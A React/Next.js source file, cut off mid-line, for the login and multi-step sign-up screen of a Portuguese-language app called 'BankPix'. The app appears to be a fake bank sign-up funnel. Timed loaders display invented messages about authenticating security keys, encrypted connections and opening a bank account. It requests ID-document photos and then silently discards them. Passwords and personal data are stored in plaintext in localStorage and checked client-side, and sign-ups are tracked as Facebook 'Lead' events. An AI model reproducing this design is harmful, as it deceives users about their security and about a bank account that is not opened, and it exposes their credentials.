'use client'

import { useState, useEffect } from 'react'
import { ArrowRight, ArrowLeft, Phone, User, Lock, CheckCircle, Wallet, Calendar, BarChart3, MapPin, Eye, EyeOff, ShieldCheck, Sparkles, UploadCloud, Zap } from 'lucide-react'
import { showInstallPrompt } from './install-prompt'

export function LoginScreen({ onLogin }: { onLogin: (userData: any) => void }) {
  const [mode, setMode] = useState<'login' | 'register'>('login')
  const [step, setStep] = useState(1)
  const [isProcessing, setIsProcessing] = useState(false)
  const [preLinkLoading, setPreLinkLoading] = useState(false)
  const [finalLoading, setFinalLoading] = useState(false)
  const [loadingMessage, setLoadingMessage] = useState('')

  // Estados do Formulário
  const [name, setName] = useState('')
  const [phone, setPhone] = useState('')
  const [password, setPassword] = useState('')
  const [confirmPassword, setConfirmPassword] = useState('')
  const [province, setProvince] = useState('')
  const [birthDate, setBirthDate] = useState('')
  const [dailyLimit, setDailyLimit] = useState('')
  const [showPass, setShowPass] = useState(false)

  // Estados da Etapa de Documento
  const [docStep, setDocStep] = useState<'frente' | 'verso' | 'previa'>('frente')
  const [frontImage, setFrontImage] = useState<string | null>(null)
  const [backImage, setBackImage] = useState<string | null>(null)

  const totalSteps = 7
  const stepsRemaining = totalSteps - step

  const trackLead = () => {
    if (typeof window !== 'undefined' && (window as any).fbq) {
      (window as any).fbq('track', 'Lead', {
        content_name: 'Cadastro BankPix',
        status: 'Iniciado'
      });
    }
  }

  useEffect(() => {
    if (finalLoading) {
      const messages = [
        'Autenticando chaves de segurança...',
        'Sincronizando infraestrutura Pix...',
        'Estabelecendo conexão criptografada...',
        'Finalizando abertura de conta bancária...',
        'Quase pronto, por favor aguarde...'
      ]
      let i = 0
      const interval = setInterval(() => {
        setLoadingMessage(messages[i])
        i = (i + 1) % messages.length
      }, 3500)
      return () => clearInterval(interval)
    }
  }, [finalLoading])

  const handleActualLogin = async (e: React.FormEvent) => {
    e.preventDefault();

    const savedData = localStorage.getItem(`bankpix_user_${phone}`);

    if (!savedData) {
      alert("Conta não encontrada. Por favor, crie uma nova conta.");
      return;
    }

    try {
      const userData = JSON.parse(savedData);

      if (userData.password !== password) {
        alert("Senha incorreta!");
        return;
      }

      setPreLinkLoading(true);

      // Recupera o UUID real do usuário no Supabase
      const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL;
      const supabaseAnonKey =
        process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY;

      if (supabaseUrl && supabaseAnonKey) {
        const response = await fetch(
          `${supabaseUrl}/rest/v1/bankpix_users?phone=eq.${encodeURIComponent(
            phone
          )}&select=id,name,phone,access_type`,
          {
            headers: {
              apikey: supabaseAnonKey,
              Authorization: `Bearer ${supabaseAnonKey}`,
            },
          }
        );

        if (response.ok) {
          const users = await response.json();

          if (Array.isArray(users) && users.length > 0) {
            const user = users[0];

            // Guarda o UUID real
            localStorage.setItem(
              "bankpix_user_id",
              user.id
            );

            // Avisa o Service Worker Register
            // que o usuário já está identificado
            window.dispatchEvent(
              new Event("bankpix-user-ready")
            );

            console.log(
              "Usuário identificado:",
              user.id
            );
          }
        }
      }

      await new Promise((r) => setTimeout(r, 6000));

      setPreLinkLoading(false);

      onLogin(userData);
    } catch (error) {
      console.error("Erro ao realizar login:", error);

      setPreLinkLoading(false);

      alert("Ocorreu um erro ao entrar na conta.");
    }
  };

  const nextStep = async () => {
    if (step === 1) trackLead();
    setIsProcessing(true)
    await new Promise(r => setTimeout(r, 1200))
    setIsProcessing(false)
    setStep(s => s + 1)
  }

  const handleImageUpload = (e: React.ChangeEvent<HTMLInputElement>, type: 'front' | 'back') => {
    const file = e.target.files?.[0]
    if (file) {
      const fakeUrl = URL.createObjectURL(file)
      if (type === 'front') {
        setFrontImage(fakeUrl)
        setDocStep('verso')
      } else {
        setBackImage(fakeUrl)
        setDocStep('previa')
      }
    }
  }

  const handleDocumentSubmit = async () => {
    setIsProcessing(true)
    setLoadingMessage('Estamos recebendo sua foto...')
    
    await new Promise(r => setTimeout(r, 6000))
    
    if (frontImage) URL.revokeObjectURL(frontImage)
    if (backImage) URL.revokeObjectURL(backImage)
    setFrontImage(null)
    setBackImage(null)

    setIsProcessing(false)
    setLoadingMessage('')
    
    handleFinalRegister()
  }

  const handleFinalRegister = async () => {
    setPreLinkLoading(true)
    // ⏳ AJUSTE DO TEMPO 1: Agora aguarda 10 segundos
    await new Promise(r => setTimeout(r, 10000))
    setPreLinkLoading(false)

    setFinalLoading(true)

    // 1. Determina o plano (free/vip) e firstName
    const params = new URLSearchParams(window.location.search)
    const isVip = params.get('acesso') === 'vip' || params.get('plano') === 'vip'
    const planoAtual = isVip ? 'VIP' : 'FREE'
    const firstName = name.trim().split(' ')[0] || 'Visitante'

    try {
      const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL
      const supabaseAnonKey = process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY

      if (supabaseUrl && supabaseAnonKey) {
        const response = await fetch(`${supabaseUrl}/rest/v1/bankpix_users`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            apikey: supabaseAnonKey,
            Authorization: `Bearer ${supabaseAnonKey}`,
            Prefer: 'resolution=merge-duplicates,return=representation',
          },
          body: JSON.stringify({
            name: name.trim(),
            phone: phone,
            access_type: planoAtual,
            push_enabled: false,
            vip_activated_at: planoAtual === 'VIP' ? new Date().toISOString() : null
          }),
        })

        if (response.ok) {
          const data = await response.json()
          if (
            data &&
            Array.isArray(data) &&
            data.length > 0 &&
            data[0].id
          ) {
            const userId = data[0].id;

            // Guarda o UUID real do usuário
            localStorage.setItem(
              "bankpix_user_id",
              userId
            );

            // Avisa o Service Worker Register
            // que o usuário já foi identificado
            window.dispatchEvent(
              new Event("bankpix-user-ready")
            );

            console.log(
              "Usuário cadastrado e vinculado ao Push:",
              userId
            );
          } else if (data && data.id) {
            const userId = data.id;

            localStorage.setItem(
              "bankpix_user_id",
              userId
            );

            window.dispatchEvent(
              new Event("bankpix-user-ready")
            );

            console.log(
              "Usuário cadastrado e vinculado ao Push:",
              userId
            );
          }
        }
      }
    } catch (error) {
      console.error('Erro ao cadastrar:', error)
    }

    // ⏳ AJUSTE DO TEMPO 2: Agora aguarda mais 10 segundos (Totalizando 20 segundos)
    await new Promise(r => setTimeout(r, 10000))

    const userData = { 
      name: name.trim(), phone, password, province, birthDate, dailyLimit,
      balance: 0, income: 0, keys: [], transactions: [] 
    }
    
    localStorage.setItem(`bankpix_user_${phone}`, JSON.stringify(userData))
    setStep(8)
    setFinalLoading(false)
  }

  const handleCompleteRegistration = () => {
    const data = localStorage.getItem(`bankpix_user_${phone}`);
    if (data) {
      const userData = JSON.parse(data);
      showInstallPrompt();
      onLogin(userData);
    }
  }

  // --- LOADING PRÉ-LINK PREMIUM ---
  if (preLinkLoading) {
    return (
      <div className="min-h-screen flex flex-col items-center justify-center bg-gradient-to-br from-blue-50 via-blue-100 to-indigo-50 p-6 text-center antialiased select-none">
        <div className="absolute inset-0 overflow-hidden">
          <div className="absolute top-20 left-10 w-72 h-72 bg-blue-300 rounded-full mix-blend-multiply filter blur-3xl opacity-20 animate-blob"></div>
          <div className="absolute top-40 right-10 w-72 h-72 bg-indigo-300 rounded-full mix-blend-multiply filter blur-3xl opacity-20 animate-blob animation-delay-2000"></div>
        </div>
        
        <div className="relative z-10">
          <div className="relative w-24 h-24 mb-8 flex items-center justify-center">
            <div className="absolute inset-0 border-3 border-blue-200 rounded-full"></div>
            <div className="absolute inset-0 border-3 border-transparent border-t-blue-600 border-r-indigo-500 rounded-full animate-spin"></div>
            <ShieldCheck className="w-10 h-10 text-blue-600 animate-pulse" />
          </div>
          <h1 className="text-xl font-black tracking-widest text-blue-900 uppercase mb-3 animate-pulse">
            Conexão Segura
          </h1>
          <p className="text-base text-blue-700 max-w-xs font-semibold leading-relaxed">
            Autenticando as chaves do seu dispositivo em ambiente corporativo de alta segurança.
          </p>
        </div>
      </div>
    )
  }

  // --- LOADING FINAL PREMIUM ---
  if (finalLoading) {
    return (
      <div className="min-h-screen flex flex-col items-center justify-center bg-gradient-to-br from-blue-900 via-indigo-900 to-blue-950 p-6 text-center antialiased">
        <div className="absolute inset-0 overflow-hidden">
          <div className="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 w-96 h-96 bg-blue-500 rounded-full mix-blend-screen filter blur-3xl opacity-20 animate-pulse"></div>
        </div>

        <div className="w-full max-w-sm bg-gradient-to-br from-blue-800/40 to-indigo-800/40 border border-blue-600/30 rounded-3xl p-8 backdrop-blur-2xl relative z-10 shadow-2xl">
          <div className="relative w-16 h-16 mx-auto mb-8 flex items-center justify-center">
            <div className="absolute inset-0 border-3 border-blue-400/20 rounded-full"></div>
            <div className="absolute inset-0 border-3 border-transparent border-t-blue-400 border-r-cyan-400 rounded-full animate-spin"></div>
            <Zap className="w-7 h-7 text-blue-300 animate-pulse" />
          </div>
          <h2 className="text-sm font-bold text-blue-200 uppercase tracking-widest mb-4">Análise Avançada</h2>
          <p className="text-lg font-semibold text-blue-50 h-16 flex items-center justify-center px-4 transition-all duration-300 animate-pulse">
            {loadingMessage || 'Processando requisição...'}
          </p>
          <div className="mt-8 w-full bg-blue-900/50 h-2 rounded-full overflow-hidden border border-blue-600/30">
            <div className="bg-gradient-to-r from-blue-400 to-cyan-400 h-full w-3/4 animate-[pulse_1.5s_infinite] rounded-full shadow-lg shadow-blue-400/50"></div>
          </div>
        </div>
      </div>
    )
  }

  // --- LOGIN PREMIUM AZULADO ---
  if (mode === 'login') {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gradient-to-br from-blue-50 via-white to-indigo-50 p-6 antialiased">
        <div className="absolute inset-0 overflow-hidden pointer-events-none">
          <div className="absolute top-0 right-0 w-96 h-96 bg-blue-200 rounded-full mix-blend-multiply filter blur-3xl opacity-10"></div>
          <div className="absolute bottom-0 left-0 w-96 h-96 bg-indigo-200 rounded-full mix-blend-multiply filter blur-3xl opacity-10"></div>
        </div>

        <div className="w-full max-w-md bg-white rounded-[40px] p-10 border border-blue-100 shadow-2xl flex flex-col justify-between relative min-h-[600px] z-10">
          
          <div>
            <div className="flex items-center gap-3 mb-12">
              <div className="p-3 bg-gradient-to-br from-blue-600 to-indigo-600 rounded-2xl text-white shadow-lg">
                <Wallet className="w-6 h-6" />
              </div>
              <span className="text-2xl font-black tracking-tight text-blue-900">
                Bank<span className="text-blue-600 font-black">Pix</span>
              </span>
            </div>

            <h1 className="text-3xl font-black tracking-tight text-blue-900 mb-3 leading-tight">Bem-vindo de volta!</h1>
            <p className="text-base text-blue-600 font-semibold mb-10">Acesse sua conta com suas credenciais.</p>
            
            <form onSubmit={handleActualLogin} className="space-y-6">
              <div className="relative flex items-center">
                <User className="absolute left-5 w-5 h-5 text-blue-400" />
                <input 
                  type="tel" placeholder="Seu telefone ou chave" 
                  className="w-full p-5 pl-14 bg-gradient-to-r from-blue-50 to-indigo-50 border-2 border-transparent rounded-3xl text-blue-900 font-semibold text-base outline-none focus:border-blue-500 focus:bg-white transition-all placeholder:text-blue-300"
                  value={phone} onChange={e => setPhone(e.target.value)}
                />
              </div>

              <div className="relative flex items-center">
                <Lock className="absolute left-5 w-5 h-5 text-blue-400" />
                <input 
                  type={showPass ? 'text' : 'password'} placeholder="Sua senha segura" 
                  className="w-full p-5 pl-14 pr-14 bg-gradient-to-r from-blue-50 to-indigo-50 border-2 border-transparent rounded-3xl text-blue-900 font-semibold text-base outline-none focus:border-blue-500 focus:bg-white transition-all placeholder:text-blue-300"
                  value={password} onChange={e => setPassword(e.target.value)}
                />
                <button type="button" onClick={() => setShowPass(!showPass)} className="absolute right-5 text-blue-400 hover:text-blue-600 transition-colors">
                  {showPass ? <EyeOff size={20} /> : <Eye size={20} />}
                </button>
              </div>

              <button type="submit" className="w-full py-5 bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-700 hover:to-indigo-700 text-white rounded-3xl font-bold text-lg tracking-wide transition-all shadow-lg hover:shadow-xl active:scale-[0.98] mt-6">
                Entrar agora
              </button>
            </form>
          </div>

          <div className="mt-10 pt-8 border-t border-blue-100">
            <button 
              onClick={() => { setMode('register'); setStep(1); setDocStep('frente'); }}
              className="w-full py-5 text-blue-600 hover:bg-blue-50 rounded-3xl font-bold text-lg transition-all"
            >
              Criar conta gratuita
            </button>
          </div>

        </div>
      </div>
    )
  }

  const stepInfo: { [key: number]: { icon: React.ReactNode; title: string; subtitle: string } } = {
    1: { icon: <User className="w-7 h-7 text-blue-600" />, title: "Qual é o seu NOME COMPLETO?", subtitle: "Preencha exatamente como consta no seu documento oficial." },
    2: { icon: <Calendar className="w-7 h-7 text-blue-600" />, title: "Quando você nasceu?", subtitle: "Data de nascimento para validação de maioridade legal." },
    3: { icon: <MapPin className="w-7 h-7 text-blue-600" />, title: "Onde você RESIDE?", subtitle: "Selecione a sua localização de domicílio fiscal." },
    4: { icon: <Phone className="w-7 h-7 text-blue-600" />, title: "Qual seu TELEFONE?", subtitle: "Este será seu identificador único e seguro de login." },
    5: { icon: <BarChart3 className="w-7 h-7 text-blue-600" />, title: "Qual seu LIMITE DIÁRIO?", subtitle: "Defina seu volume operacional de movimentação." },
    6: { icon: <Lock className="w-7 h-7 text-blue-600" />, title: "Crie sua SENHA DE SEGURANÇA", subtitle: "Use uma combinação forte para suas transações." },
    7: { icon: <ShieldCheck className="w-7 h-7 text-blue-600" />, title: "VERIFICAÇÃO DE IDENTIDADE", subtitle: "Capture imagem nítida do seu documento." }
  }

  const renderStepContent = () => {
    if (isProcessing) {
      return (
        <div className="flex flex-col items-center justify-center py-24 space-y-6">
          <div className="relative w-14 h-14 flex items-center justify-center">
            <div className="absolute inset-0 border-3 border-blue-200 rounded-full"></div>
            <div className="absolute inset-0 border-3 border-transparent border-t-blue-600 rounded-full animate-spin"></div>
          </div>
          <p className="text-lg font-bold text-blue-600 tracking-wide animate-pulse">Salvando com segurança...</p>
        </div>
      )
    }

    const currentStepInfo = stepInfo[step]

    switch (step) {
      case 1:
        return (
          <div className="space-y-10 animate-in fade-in slide-in-from-right-6 duration-500">
            <div className="space-y-3">
              <h2 className="text-4xl font-black text-blue-900 tracking-tight leading-tight">{currentStepInfo.title}</h2>
              <p className="text-lg text-blue-600 font-semibold leading-relaxed">{currentStepInfo.subtitle}</p>
            </div>
            <input autoFocus className="w-full p-5 bg-gradient-to-r from-blue-50 to-indigo-50 border-2 border-transparent focus:border-blue-500 focus:bg-white rounded-3xl text-blue-900 font-bold text-xl outline-none transition-all uppercase placeholder:normal-case placeholder:font-semibold placeholder:text-blue-300" value={name} onChange={e => setName(e.target.value)} placeholder="Digite seu nome" />
            <button onClick={nextStep} disabled={!name.trim()} className="w-full py-5 bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-700 hover:to-indigo-700 text-white rounded-3xl font-bold text-lg tracking-wide flex items-center justify-center gap-3 disabled:opacity-30 disabled:cursor-not-allowed transition-all active:scale-[0.98] shadow-lg">Próximo <ArrowRight size={22} /></button>
          </div>
        )
      case 2:
        return (
          <div className="space-y-10 animate-in fade-in slide-in-from-right-6 duration-500">
            <div className="space-y-3">
              <h2 className="text-4xl font-black text-blue-900 tracking-tight leading-tight">{currentStepInfo.title}</h2>
              <p className="text-lg text-blue-600 font-semibold leading-relaxed">{currentStepInfo.subtitle}</p>
            </div>
            <input type="date" className="w-full p-5 bg-gradient-to-r from-blue-50 to-indigo-50 border-2 border-transparent focus:border-blue-500 focus:bg-white rounded-3xl text-blue-900 font-bold text-lg outline-none transition-all cursor-pointer" value={birthDate} onChange={e => setBirthDate(e.target.value)} />
            <button onClick={nextStep} disabled={!birthDate} className="w-full py-5 bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-700 hover:to-indigo-700 text-white rounded-3xl font-bold text-lg tracking-wide flex items-center justify-center gap-3 disabled:opacity-30 disabled:cursor-not-allowed transition-all active:scale-[0.98] shadow-lg">Próximo <ArrowRight size={22} /></button>
          </div>
        )
      case 3:
        return (
          <div className="space-y-10 animate-in fade-in slide-in-from-right-6 duration-500">
            <div className="space-y-3">
              <h2 className="text-4xl font-blac
